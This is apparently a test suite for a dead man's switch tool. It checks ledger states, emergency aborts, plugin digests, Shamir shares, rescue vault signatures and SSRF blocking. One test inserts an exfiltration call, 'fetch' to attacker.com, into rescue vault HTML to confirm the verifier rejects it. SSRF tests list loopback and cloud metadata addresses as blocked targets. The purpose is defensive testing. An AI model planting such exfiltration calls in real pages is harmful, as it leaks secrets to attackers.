import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { normalizeAndValidateConfig } from '../src/config/loader.ts';
import { OboldDatabase } from '../src/db/database.ts';
import { OboldEngine } from '../src/core/engine.ts';
import { OboldCipher } from '../src/crypto/cipher.ts';
import { PluginRegistry } from '../src/plugins/registry.ts';
import { fetchWithSsrfGuard } from '../src/plugins/network-guard.ts';
import { unlinkSync, existsSync } from 'node:fs';
import { resolve } from 'node:path';

const TEST_DB = './data/test_contracts_abort.db';

function cleanupDb() {
  try {
    if (existsSync(TEST_DB)) unlinkSync(TEST_DB);
    if (existsSync(`${TEST_DB}-wal`)) unlinkSync(`${TEST_DB}-wal`);
    if (existsSync(`${TEST_DB}-shm`)) unlinkSync(`${TEST_DB}-shm`);
  } catch {}
}

describe('Execution Contracts & Emergency Cascade Abort', () => {
  let db: OboldDatabase | null = null;
  let engine: OboldEngine | null = null;
  let cipher: OboldCipher;
  let plugins: PluginRegistry;

  beforeEach(() => {
    cleanupDb();
    db = new OboldDatabase(TEST_DB, true);
    cipher = new OboldCipher('contracts_abort_secret_key_32b!', 'chacha20-poly1305');
    plugins = new PluginRegistry();

    const config = normalizeAndValidateConfig({
      version: '1.0.0',
      storage: { path: TEST_DB },
      crypto: { algorithm: 'chacha20-poly1305', keyDerivation: 'scrypt' },
      server: { enabled: true, host: '127.0.0.1', port: 8080 },
      switches: [
        {
          id: 'vault-cascade',
          name: 'Cascade Vault',
          interval: '1h',
          gracePeriod: '10m',
          stages: [
            {
              id: 'stg-1',
              name: 'Stage 1 Warning',
              delay: '0s',
              actions: [
                {
                  id: 'act-unregistered',
                  plugin: 'core:unregistered_plugin_xyz',
                  config: { key: 'val' },
                },
              ],
            },
          ],
        },
      ],
    });

    engine = new OboldEngine(config, db, cipher, plugins);
  });

  afterEach(() => {
    if (db) {
      db.close();
      db = null;
    }
    cleanupDb();
  });

  it('Marks ledger entry as BLOCKED_PLUGIN_MISSING and sets switch status to BLOCKED when a plugin is missing', async () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    await engine.triggerSwitch('vault-cascade', false);

    const sw = db.getSwitch('vault-cascade');
    expect(sw).not.toBeNull();
    expect(sw?.status).toBe('BLOCKED');

    const ledgerEntries = db.getRecentLedgerEntries(10);
    expect(ledgerEntries.length).toBeGreaterThan(0);
    const missingEntry = ledgerEntries.find((e) => e.plugin === 'core:unregistered_plugin_xyz');
    expect(missingEntry).not.toBeUndefined();
    expect(missingEntry?.state).toBe('BLOCKED_PLUGIN_MISSING');
    expect(missingEntry?.lastError).toContain('is not registered or unavailable');
  });

  it('Halts execution cascade immediately when abortSwitch is called', () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    const ok = engine.abortSwitch('vault-cascade', 'Operator emergency abort');
    expect(ok).toBe(true);

    const sw = db.getSwitch('vault-cascade');
    expect(sw?.status).toBe('ABORTED');

    const logs = db.getAuditLogs(10, 'vault-cascade');
    const abortLog = logs.find((l) => l.category === 'EMERGENCY_ABORT');
    expect(abortLog).not.toBeUndefined();
    expect(abortLog?.message).toContain('Operator emergency abort');
  });

  it('SSRF Guard blocks redirect chains targeting localhost or private IPs', async () => {
    const mockServer = Bun.serve({
      port: 0,
      fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === '/redirect-to-private') {
          return new Response(null, {
            status: 302,
            headers: { Location: 'http://127.0.0.1:8080/admin' },
          });
        }
        return new Response('ok', { status: 200 });
      },
    });

    try {
      const target = `http://127.0.0.1:${mockServer.port}/redirect-to-private`;
      await expect(
        fetchWithSsrfGuard(target, {}, false)
      ).rejects.toThrow(/Blocked private\/link-local SSRF network destination|Blocked localhost/);
    } finally {
      mockServer.stop();
    }
  });

  it('Computes dynamic SHA256 plugin integrity digests and reports dynamic versions', () => {
    const defaultRegistry = require('../src/plugins/registry.ts').createDefaultPluginRegistry();
    const pluginsList = defaultRegistry.list();

    expect(pluginsList.length).toBeGreaterThanOrEqual(13);
    for (const p of pluginsList) {
      expect(p.version).toBeDefined();
      expect(p.digest).toMatch(/^[a-f0-9]{64}$/);
    }
  });

  it('Executes immutable frozen plan from SQLite when active memory config has been modified', async () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    let executedPlugin = '';
    plugins.register({
      id: 'core:unregistered_plugin_xyz',
      name: 'Original Frozen Plugin',
      description: 'Test',
      version: '1.0.0',
      validateConfig: () => ({ valid: true }),
      execute: async () => {
        executedPlugin = 'core:unregistered_plugin_xyz';
        return { success: true, actionId: 'act-1', plugin: 'core:unregistered_plugin_xyz', durationMs: 5 };
      },
    });

    plugins.register({
      id: 'core:tampered_plugin',
      name: 'Tampered Plugin',
      description: 'Test',
      version: '1.0.0',
      validateConfig: () => ({ valid: true }),
      execute: async () => {
        executedPlugin = 'core:tampered_plugin';
        return { success: true, actionId: 'act-1', plugin: 'core:tampered_plugin', durationMs: 5 };
      },
    });

    const swConfig = (engine as any).config.switches.find((s: any) => s.id === 'vault-cascade');
    swConfig.stages[0].actions[0].plugin = 'core:tampered_plugin';

    await engine.triggerSwitch('vault-cascade', false);

    expect(executedPlugin).toBe('core:unregistered_plugin_xyz');

    const logs = db.getAuditLogs(10, 'vault-cascade');
    const mismatchLog = logs.find((l) => l.category === 'PLAN_HASH_MISMATCH');
    expect(mismatchLog).not.toBeUndefined();
  });

  it('Refuses to fall back to rogue .obold.key in current working directory', () => {
    const { getStableDefaultKeyPath } = require('../src/crypto/kdf.ts');
    const path = getStableDefaultKeyPath();
    expect(path).not.toContain(resolve(process.cwd(), '.obold.key'));
    expect(path).toMatch(/master\.key$/);
  });

  it('Verifies standalone rescue vault CSP compliance and rejects exfiltration scripts', () => {
    const { generateRescueBundle, verifyRescueBundle } = require('../src/crypto/rescue.ts');
    const bundle = generateRescueBundle({
      payload: 'TOP_SECRET_RECOVERY_KEY',
      threshold: 2,
      totalShares: 3,
    });

    const validResult = verifyRescueBundle(bundle.html);
    expect(validResult.valid).toBe(true);
    expect(bundle.html).toContain('Content-Security-Policy');

    const noCspHtml = bundle.html.replace(/<meta http-equiv="Content-Security-Policy"[^>]+>/, '');
    const noCspResult = verifyRescueBundle(noCspHtml);
    expect(noCspResult.valid).toBe(false);
    expect(noCspResult.error).toContain('Content-Security-Policy');

    const exfilHtml = bundle.html.replace('const vaultData', 'fetch("https://attacker.com"); const vaultData');
    const exfilResult = verifyRescueBundle(exfilHtml);
    expect(exfilResult.valid).toBe(false);
    expect(exfilResult.error).toMatch(/digest mismatch|Network communication/);
  });

  it('Verifies standalone rescue vault detached cryptographic signatures', () => {
    const { generateRescueBundle, generateRescueSignature, verifyRescueSignature } = require('../src/crypto/rescue.ts');
    const bundle = generateRescueBundle({
      payload: 'TOP_SECRET_RECOVERY_KEY',
      threshold: 2,
      totalShares: 3,
    });

    const secretKey = 'signing-key-secret-123';
    const sig = generateRescueSignature(bundle.html, secretKey);
    expect(sig).toBeDefined();
    expect(sig.length).toBe(64);

    const valid = verifyRescueSignature(bundle.html, sig, secretKey);
    expect(valid).toBe(true);

    const wrongKeyValid = verifyRescueSignature(bundle.html, sig, 'wrong-key');
    expect(wrongKeyValid).toBe(false);

    const tamperedValid = verifyRescueSignature(bundle.html + ' ', sig, secretKey);
    expect(tamperedValid).toBe(false);
  });

  it('Canonical JSON serializes undefined in arrays as null and omits object undefined/functions/symbols', () => {
    const { canonicalJsonStringify } = require('../src/core/engine.ts');
    const input = {
      b: 2,
      a: 1,
      c: undefined,
      d: () => {},
      e: Symbol('test'),
      arr: [1, undefined, NaN, Infinity, 'test'],
    };
    const json = canonicalJsonStringify(input);
    expect(json).toBe('{"a":1,"arr":[1,null,null,null,"test"],"b":2}');
  });

  it('ShamirSecretSharing rejects invalid x, mismatched thresholds, mismatched total, and unequal payload lengths', () => {
    const { ShamirSecretSharing } = require('../src/crypto/shamir.ts');
    const shares = ShamirSecretSharing.split('super-secret-key-12345', 5, 3);
    const parts = shares[0].split('-');

    expect(() => ShamirSecretSharing.combine([
      `obold-share-3-of-5-0-${parts[8]}`,
      shares[1],
      shares[2]
    ])).toThrow(/x-coordinate .* must be between 1 and 255/);

    expect(() => ShamirSecretSharing.combine([
      `obold-share-2-of-5-1-${parts[8]}`,
      shares[1],
      shares[2]
    ])).toThrow(/Mismatched share thresholds/);

    expect(() => ShamirSecretSharing.combine([
      `obold-share-3-of-6-1-${parts[8]}`,
      shares[1],
      shares[2]
    ])).toThrow(/Mismatched total shares count/);

    expect(() => ShamirSecretSharing.combine([
      `obold-share-3-of-5-1-${parts[8].slice(0, 4)}`,
      shares[1],
      shares[2]
    ])).toThrow(/Inconsistent share payload length/);
  });

  it('Replay halts in UNKNOWN state on plugin digest or version mismatch', async () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    const testPlugin = {
      id: 'core:tamper_test',
      name: 'Tamper Test Plugin',
      description: 'Tamper test',
      version: '1.0.0',
      validateConfig: () => ({ valid: true }),
      execute: async () => ({ success: true, actionId: 'a', plugin: 'core:tamper_test', durationMs: 0 }),
    };
    plugins.register(testPlugin);

    db.insertLedgerEntry({
      id: 'led-tamper-001',
      switchId: 'vault-cascade',
      stageId: 'stg-1',
      actionId: 'act-tamper',
      plugin: 'core:tamper_test',
      state: 'EXECUTING',
      idempotencyKey: 'idemp-tamper-1',
      attemptCount: 1,
      maxAttempts: 3,
      nextRetryAt: null,
      lastError: null,
      payloadSnapshot: null,
      resultSnapshot: null,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      dispatchedAt: Date.now(),
      acknowledgedAt: null,
      destructive: false,
      privileged: false,
      pluginVersion: '0.9.0',
      pluginDigest: 'sha256-invalid-digest',
      configHash: null,
      payloadHash: null,
      deadlineAt: null,
      replaySafety: 'UNKNOWN',
    });

    await engine.replayLedger();
    const entryAfter = db.getLedgerEntry('led-tamper-001');
    expect(entryAfter?.state).toBe('UNKNOWN');
    expect(entryAfter?.lastError).toContain('digest mismatch');
  });

  it('Replay honors immutable destructive contract field even when active config is changed to false', async () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    db.insertLedgerEntry({
      id: 'led-dest-persist-001',
      switchId: 'vault-cascade',
      stageId: 'stg-1',
      actionId: 'act-unregistered',
      plugin: 'core:unregistered_plugin_xyz',
      state: 'EXECUTING',
      idempotencyKey: 'idemp-dest-persist-1',
      attemptCount: 1,
      maxAttempts: 3,
      nextRetryAt: null,
      lastError: null,
      payloadSnapshot: null,
      resultSnapshot: null,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      dispatchedAt: Date.now(),
      acknowledgedAt: null,
      destructive: true,
      privileged: false,
      pluginVersion: null,
      pluginDigest: null,
      configHash: null,
      payloadHash: null,
      deadlineAt: null,
      replaySafety: 'UNKNOWN',
    });

    await engine.replayLedger();
    const entryAfter = db.getLedgerEntry('led-dest-persist-001');
    expect(entryAfter?.state).toBe('UNKNOWN');
    expect(entryAfter?.lastError).toContain('Crash recovery paused: action is destructive');
  });

  it('verifyRescueBundle accepts detached signature option', () => {
    const { generateRescueBundle, generateRescueSignature, verifyRescueBundle } = require('../src/crypto/rescue.ts');
    const bundle = generateRescueBundle({
      payload: 'SIGNATURE_TEST_KEY',
      threshold: 2,
      totalShares: 3,
    });
    const key = 'secret-sign-key-xyz';
    const sig = generateRescueSignature(bundle.html, key);

    const valid = verifyRescueBundle(bundle.html, { signatureHex: sig, signingKey: key });
    expect(valid.valid).toBe(true);

    const invalid = verifyRescueBundle(bundle.html, { signatureHex: 'a'.repeat(64), signingKey: key });
    expect(invalid.valid).toBe(false);
    expect(invalid.error).toContain('signature verification failed');
  });

  it('createWebSocketWithSsrfGuard blocks loopback and private websocket destinations', async () => {
    const { createWebSocketWithSsrfGuard } = require('../src/plugins/network-guard.ts');
    expect(createWebSocketWithSsrfGuard('ws://127.0.0.1:8080')).rejects.toThrow();
    expect(createWebSocketWithSsrfGuard('ws://169.254.169.254/latest')).rejects.toThrow();
    expect(createWebSocketWithSsrfGuard('ws://localhost:9000')).rejects.toThrow();
  });

  it('canonicalJsonStringify rejects BigInt values with TypeError', () => {
    const { canonicalJsonStringify } = require('../src/core/engine.ts');
    expect(() => canonicalJsonStringify({ val: BigInt(123) })).toThrow(TypeError);
    expect(() => canonicalJsonStringify(BigInt(999))).toThrow(TypeError);
  });

  it('NostrPlugin generates deterministic event ID and signature for identical deadline and idempotencyKey', async () => {
    const { NostrPlugin } = require('../src/plugins/core/nostr.ts');
    const plugin = new NostrPlugin();
    expect(plugin.replaySafety).toBe('IDEMPOTENT');
    expect(plugin.capabilities).toContain('NETWORK_PUBLIC');

    const privKey = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
    const config = {
      relays: ['wss://nostr.example.com'],
      private_key: privKey,
      content: 'Dead man switch activated',
    };
    const context = {
      switchId: 'sw-nostr-test',
      switchName: 'Test Switch',
      stageId: 'stage-1',
      actionId: 'act-nostr',
      idempotencyKey: 'idemp-nostr-fixed-001',
      deadlineAt: 1700000000000,
      dryRun: true,
    };

    const res1 = await plugin.execute(config, context);
    const res2 = await plugin.execute(config, context);

    expect(res1.output.eventId).toBe(res2.output.eventId);
    expect(res1.output.signature).toBe(res2.output.signature);
    expect(res1.output.tags).toEqual(res2.output.tags);
    expect(res1.output.tags.some((t: string[]) => t[0] === 'idempotency' && t[1] === context.idempotencyKey)).toBe(true);
  });

  it('Rescue vault supports Ed25519 asymmetric detached signatures', () => {
    const {
      generateRescueBundle,
      generateRescueAsymmetricKeyPair,
      generateRescueSignature,
      verifyRescueSignature,
      verifyAuthenticatedRescueBundle,
    } = require('../src/crypto/rescue.ts');

    const bundle = generateRescueBundle({
      payload: 'TOP_SECRET_ASYMMETRIC_PAYLOAD',
      threshold: 2,
      totalShares: 3,
    });

    const { publicKey, privateKey } = generateRescueAsymmetricKeyPair();
    expect(publicKey).toContain('PUBLIC KEY');
    expect(privateKey).toContain('PRIVATE KEY');

    const signature = generateRescueSignature(bundle.html, privateKey);
    expect(signature.length).toBe(128);

    const valid = verifyRescueSignature(bundle.html, signature, publicKey);
    expect(valid).toBe(true);

    const authResult = verifyAuthenticatedRescueBundle(bundle.html, {
      signatureHex: signature,
      signingKey: publicKey,
    });
    expect(authResult.valid).toBe(true);

    const tampered = verifyRescueSignature(bundle.html + ' ', signature, publicKey);
    expect(tampered).toBe(false);

    const otherKeyPair = generateRescueAsymmetricKeyPair();
    const wrongKey = verifyRescueSignature(bundle.html, signature, otherKeyPair.publicKey);
    expect(wrongKey).toBe(false);
  });

  it('normalizeMasterKey enforces strict minimum 12-char passphrase unless OBOLD_INSECURE_PASSPHRASE=1', () => {
    const { normalizeMasterKey } = require('../src/crypto/kdf.ts');
    const orig = process.env.OBOLD_INSECURE_PASSPHRASE;
    delete process.env.OBOLD_INSECURE_PASSPHRASE;
    try {
      expect(() => normalizeMasterKey('short')).toThrow(/Weak passphrase detected/);
      process.env.OBOLD_INSECURE_PASSPHRASE = '1';
      expect(() => normalizeMasterKey('short')).not.toThrow();
    } finally {
      if (orig !== undefined) {
        process.env.OBOLD_INSECURE_PASSPHRASE = orig;
      } else {
        delete process.env.OBOLD_INSECURE_PASSPHRASE;
      }
    }
  });

  it('resolveMasterKey preserves pre-existing keyfile on concurrent access without unlinking', () => {
    const { resolveMasterKey } = require('../src/crypto/kdf.ts');
    const { writeFileSync, existsSync, unlinkSync } = require('node:fs');
    const { join } = require('node:path');
    const { tmpdir } = require('node:os');
    const testKeyPath = join(tmpdir(), `obold-test-preexist-${Date.now()}.key`);
    const initialKeyHex = '11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff';
    writeFileSync(testKeyPath, `${initialKeyHex}\n`, { mode: 0o600 });
    try {
      const resolved = resolveMasterKey(undefined, testKeyPath);
      expect(resolved.toString('hex')).toBe(initialKeyHex);
      expect(existsSync(testKeyPath)).toBe(true);
    } finally {
      if (existsSync(testKeyPath)) {
        unlinkSync(testKeyPath);
      }
    }
  });

  it('Execution ledger persists contractVersion, planHash, appVersion, and contractHash', () => {
    if (!db) throw new Error('DB not initialized');
    const entryId = `led-contract-test-${Date.now()}`;
    db.insertLedgerEntry({
      id: entryId,
      switchId: 'vault-cascade',
      stageId: 'stg-1',
      actionId: 'act-contract',
      plugin: 'core:shell',
      state: 'PENDING',
      idempotencyKey: 'idemp-c1',
      attemptCount: 0,
      maxAttempts: 3,
      nextRetryAt: null,
      lastError: null,
      payloadSnapshot: null,
      resultSnapshot: null,
      createdAt: Date.now(),
      updatedAt: Date.now(),
      dispatchedAt: null,
      acknowledgedAt: null,
      destructive: false,
      privileged: false,
      pluginVersion: '1.0.0',
      pluginDigest: 'd1',
      configHash: 'ch1',
      payloadHash: 'ph1',
      deadlineAt: 1700000000000,
      replaySafety: 'UNKNOWN',
      switchVersion: 2,
      planHash: 'planhash123',
      appVersion: '1.0.0',
      contractVersion: 1,
      contractHash: 'contracthash456',
    });

    const retrieved = db.getLedgerEntry(entryId);
    expect(retrieved).not.toBeNull();
    expect(retrieved?.switchVersion).toBe(2);
    expect(retrieved?.planHash).toBe('planhash123');
    expect(retrieved?.appVersion).toBe('1.0.0');
    expect(retrieved?.contractVersion).toBe(1);
    expect(retrieved?.contractHash).toBe('contracthash456');
    expect(retrieved?.replaySafety).toBe('UNKNOWN');
  });
});
